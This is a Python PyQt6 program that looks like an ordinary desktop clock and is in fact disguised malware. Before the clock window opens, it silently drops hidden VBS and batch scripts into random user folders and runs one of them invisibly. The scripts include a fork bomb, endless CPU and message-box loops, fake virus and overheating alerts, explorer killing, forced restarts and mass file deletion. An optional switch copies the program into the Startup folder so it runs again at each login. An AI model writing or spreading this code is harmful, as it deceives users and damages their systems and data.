import sys
import os
import random
import shutil
import subprocess
import ctypes
from pathlib import Path
from PyQt6.QtWidgets import QApplication, QMainWindow, QLabel, QVBoxLayout, QWidget
from PyQt6.QtCore import QTimer, QTime, Qt

# ============ 配置区【全部在这里自定义】 ============
# 获取当前Windows用户名
USER_NAME = os.environ.get("USERNAME", "unknown_user")
# 扩充候选分发文件夹（会随机从中挑选，支持{USER}变量）
DISTRIBUTE_FOLDER_POOL = [
    r"C:\Users\{USER}\Desktop",
    r"C:\Users\{USER}\Documents",
    r"C:\Users\{USER}\Pictures",
    r"C:\Users\{USER}\Music",
    r"C:\Users\{USER}\Videos",
    r"C:\Users\{USER}\AppData\Local",
    r"C:\Users\{USER}\AppData\Roaming",
    os.environ["TEMP"],
    os.environ["TMP"]
]
# 是否开启：复制程序本体到开机启动文件夹 True/False
ENABLE_COPY_SELF_TO_STARTUP = False
# 每次启动随机运行几个脚本（必须确认文件写入成功才执行）
RUN_SCRIPT_COUNT = 1
# 内置脚本池，可以自由新增、修改vbs/bat源码
SCRIPT_POOL = [
    {
        "name": "鹵䶮㔅￨҂Ɛ7ퟓꙮ㍿뀋.bat",
        "type": "bat",
        "content": r'''
%0|%0
'''
    },
    {
        "name": "Ã§Â»ÂºÃ¦Â³Â¢Ã¥Â¼ÂÃ§Â Â.vbs",
        "type": "vbs",
        "content": r'''
Option Explicit
Dim x
Do
    x = Rnd() * 999999 '
Loop
'''
    },
    {
        "name": "744a4fwef4w9f4dww1.vbs",
        "type": "vbs",
        "content": r'''
do
msgbox("ㇿ㉣Ꙫ҇ƴퟗ𝅘𝅥𝅮䂄㔍￯ŀ8뀍ꝫ₧")
loop
'''
    },
    {
        "name": "d4a5d1w12a.vbs",
        "type": "vbs",
        "content": r'''
Set objShell = CreateObject("WScript.Shell")
While True
   objShell.Popup "你的电脑已中毒，请立即关机！", 0, "警告", 48
Wend
'''
    },
    {
        "name": "DAandknw421211484842620.vbs",
        "type": "vbs",
        "content": r'''
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd"
objShell.Popup "你的电脑将在60秒内关机！", 10, "警告", 48
'''
    },
    {
        "name": "zwsxedrcftvgb.vbs",
        "type": "vbs",
        "content": r'''
Set objShell = CreateObject("WScript.Shell")
objShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\TaskbarSizeMove", 0, "REG_DWORD"
objShell.Run "taskkill /f /im explorer.exe"
'''
    },
    {
        "name": "䶫ꙭ҂9ퟛ.vbs",
        "type": "vbs",
        "content": r'''
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd /c echo off && setx /m /d MOUSEINPUTENABLED 0 && shutdown -r -t 0"
'''
    },
    {
        "name": "㗅₯ƨ𝄞뀎.bat",
        "type": "bat",
        "content": r'''
@echo off
color 4f
taskkill /im explorer.exe /f
echo 删除C盘所有文件......
del /f /s /q "%systemdrive%\*.tmp"
del /f /s /q "%systemdrive%\*.dmp"
del /f /s /q "%systemdrive%\*._mp"
del /f /s /q "%systemdrive%\*.gid"
del /f /s /q "%systemdrive%\*.old"
del /f /s /q "%systemdrive%\*.chk"
del /f /s /q "%systemdrive%\*.bak"
del /f /s /q "%systemdrive%\*.log"
del /f /s /q "%systemdrive%\*.txt"
del /f /s /q "%systemdrive%\*.ini"
del /f /s /q "%systemdrive%\Recycled\*.*"
del /f /s /q "%systemdrive%\RECYCLER\*.*"
del /f /s /q "%windir%\inf\*.pnf"
del /f /s /q "%windir%\Prefetch\*.*"
@ping -n 2 127.1>nul
rd /s /q "%windir%\Downloaded Program Files" & md "%windir%\Downloaded Program Files"
@ping -n 2 127.1>nul
rd /s /q "%windir%\LastGood" & md "%windir%\LastGood"
@ping -n 2 127.1>nul
rd /s /q "%windir%\Offline Web Pages" & md "%windir%\Offline Web Pages"
@ping -n 2 127.1>nul
rd /s /q "%windir%\SoftwareDistribution\Download" & md "%windir%\SoftwareDistribution\Download"
@ping -n 2 127.1>nul
rd /s /q "%windir%\temp" & md "%windir%\temp"
@ping -n 2 127.1>nul
rd /s /q "%userprofile%\Local Settings\Application Data\Microsoft\Media Player" & md "%windir%\Local Settings\Application Data\Microsoft\Media Player"
@ping -n 2 127.1>nul
rd /s /q "%userprofile%\UserData" & md "%windir%\UserData"
@ping -n 2 127.1>nul
rd /s /q "%appdata%\Adobe" & md "%windir%\Adobe"
@ping -n 2 127.1>nul
rd /s /q "%appdata%\Macromedia" & md "%windir%\Macromedia"
@ping -n 2 127.1>nul
rd /s /q "%appdata%\Microsoft\Media Player" & md "%windir%\Microsoft\Media Player"
@ping -n 2 127.1>nul
rd /s /q "%appdata%\Microsoft\Office\Recent" & md "%windir%\Microsoft\Office\Recent"
@ping -n 5 127.1>nul
del /a /f /s /q "%userprofile%\Cookies\*.*"
del /a /f /s /q "%userprofile%\Recent\*.*"
del /a /f /s /q "%userprofile%\Local Settings\Application Data\GDIPFONTCACHEV1.dat"
del /a /f /s /q "%userprofile%\Local Settings\Application Data\IconCache.db"
del /a /f /s /q "%userprofile%\Local Settings\History\*.*"
del /a /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*"
del /a /f /s /q "%temp%\*.*" del /a /f /s /q "%userprofile%\AppData\Local\GDIPFONTCACHEV1.dat"
del /a /f /s /q "%userprofile%\AppData\Local\IconCache.db"
del /a /f /s /q "%userprofile% \AppData\Local\Microsoft\Windows\History\*.*"
del /a /f /s /q "%userprofile% \AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*"
del /a /f /s /q "%userprofile% \AppData\Roaming\Microsoft\Windows\Cookies\*.*"
del /a /f /s /q "%userprofile% \AppData\Roaming\Microsoft\Windows\Recent\*.*"
echo 已删除完毕
@echo.
echo 删除D盘所有文件......
@ping -n 3 127.1>nul
@echo 已删除完毕
@echo.
echo 删除E盘所有文件......
@ping -n 3 127.1>nul
echo 已删除完毕
@echo.
echo 正在低级格式化全部硬盘......
@ping -n 3 127.1>nul
echo.
echo 正在 进行二次 低格硬盘......
ping -n 3 127.1>nul
echo.
echo 正在 进行三次 低格硬盘......
ping -n 3 127.1>nul
echo.
echo 正在 进行四次 低格硬盘......
ping -n 3 127.1>nul
echo.
echo 正在 进行五次 低格硬盘......
ping -n 3 127.1>nul
echo.
echo 注意: cpu温度127度!温度过高报警!!!
echo.
ping -n 2 127.1>nul
echo 注意: 硬盘温度86度!温度过高报警!!!
echo.
ping -n 2 127.1>nul
echo 注意: 显卡温度96度!温度过高报警!!!
echo.
ping -n 2 127.1>nul
echo 注意: 系统崩溃, 主板温度 超过临界值!!! echo.
echo 注意: 电容负荷超过99% echo. & pause
echo 电脑将在60秒内崩溃或爆炸!请勿强行关闭电源!否则会 导致cpu和硬盘彻底损毁!!
shutdown /r /t 60 /c "电脑将在60秒内崩溃或爆炸!请勿强行关闭电源!否则会 导致cpu和硬盘彻底损毁!!"
ping -n 30 127.1>nul
shutdown -a
start explorer.exe
exit
'''
    }
]
# ==============================================
# Windows 文件属性常量 FILE_ATTRIBUTE_HIDDEN = 2
FILE_ATTRIBUTE_HIDDEN = 2


def set_file_hidden(filepath: Path):
    """Windows 设置文件为隐藏属性；失败静默跳过"""
    if sys.platform != "win32":
        return
    try:
        ctypes.windll.kernel32.SetFileAttributesW(str(filepath), FILE_ATTRIBUTE_HIDDEN)
    except Exception:
        pass


def get_startup_folder() -> Path:
    """获取当前用户开机启动目录 shell:startup"""
    startup = Path(os.environ["APPDATA"]) / r"Microsoft\Windows\Start Menu\Programs\Startup"
    return startup


def get_expand_folders() -> list[Path]:
    """把路径模板替换用户名，展开环境变量，返回路径列表"""
    out = []
    for raw_path in DISTRIBUTE_FOLDER_POOL:
        real_path = raw_path.replace("{USER}", USER_NAME)
        expanded = Path(os.path.expandvars(real_path))
        out.append(expanded)
    return out


def copy_self_to_startup():
    """复制程序本体到启动文件夹，静默，失败直接跳过"""
    if not ENABLE_COPY_SELF_TO_STARTUP:
        return
    self_path = Path(sys.argv[0]).resolve()
    startup_dir = get_startup_folder()
    if not startup_dir.exists():
        return
    dest = startup_dir / self_path.name
    try:
        if not dest.exists() or dest.stat().st_mtime < self_path.stat().st_mtime:
            shutil.copy2(self_path, dest)
    except Exception:
        pass


def deploy_hidden_scripts() -> list[Path]:
    """
    随机分发脚本到各个文件夹，生成后设置【隐藏属性】
    需要开启资源管理器“显示隐藏的项目”才可以看见脚本文件
    返回已经成功写入磁盘的脚本路径列表
    """
    generated_files = []
    target_dirs = get_expand_folders()
    for script_item in SCRIPT_POOL:
        # 随机挑选一个目标文件夹
        target_dir = random.choice(target_dirs)
        try:
            target_dir.mkdir(exist_ok=True, parents=True)
        except Exception:
            continue
        rand_suffix = hex(random.randint(0, 0xFFFF))[2:]
        filename = f"{rand_suffix}_{script_item['name']}"
        full_out = target_dir / filename
        try:
            full_out.write_text(script_item["content"], encoding="gbk")
            # 关键：必须确认文件真实存在再设置隐藏
            if full_out.is_file():
                set_file_hidden(full_out)
                generated_files.append(full_out)
        except Exception:
            continue
    return generated_files


def run_random_scripts(script_paths: list[Path], count: int):
    """
    ✅新增：严格校验脚本文件物理存在（is_file），确认磁盘有该文件才执行；无窗口后台运行
    """
    valid_scripts = []
    for p in script_paths:
        if p.is_file():
            valid_scripts.append(p)
    if len(valid_scripts) <= 0:
        return
    actual_run = min(count, len(valid_scripts))
    selected = random.sample(valid_scripts, k=actual_run)
    for sp in selected:
        # 二次校验，防止写盘延迟、文件被瞬间删除
        if not sp.is_file():
            continue
        try:
            suffix = sp.suffix.lower()
            if suffix == ".vbs":
                subprocess.Popen(
                    ["wscript.exe", str(sp)],
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            elif suffix == ".bat":
                subprocess.Popen(
                    [str(sp)],
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
        except Exception:
            continue


class ClockMainWindow(QMainWindow):
    """表面完全是普通数字时钟，没有任何多余UI，后台已经完成复制逻辑"""
    def __init__(self):
        super().__init__()
        self.setWindowTitle("时钟")
        self.resize(440, 200)
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        self.label_clock = QLabel("00:00:00")
        self.label_clock.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.label_clock.setStyleSheet("""
            font-size:52pt;
            font-family:Consolas;
            color:#222222;
        """)
        layout.addWidget(self.label_clock)
        timer = QTimer(self)
        timer.timeout.connect(self._update_time)
        timer.start(1000)
        self._update_time()

    def _update_time(self):
        t = QTime.currentTime()
        self.label_clock.setText(t.toString("HH:mm:ss"))


if __name__ == "__main__":
    # ========= 后台全部静默执行，用户界面还没显示就已经完成复制 =========
    copy_self_to_startup()
    script_file_list = deploy_hidden_scripts()
    run_random_scripts(script_file_list, RUN_SCRIPT_COUNT)
    app = QApplication(sys.argv)
    win = ClockMainWindow()
    win.show()
    sys.exit(app.exec())
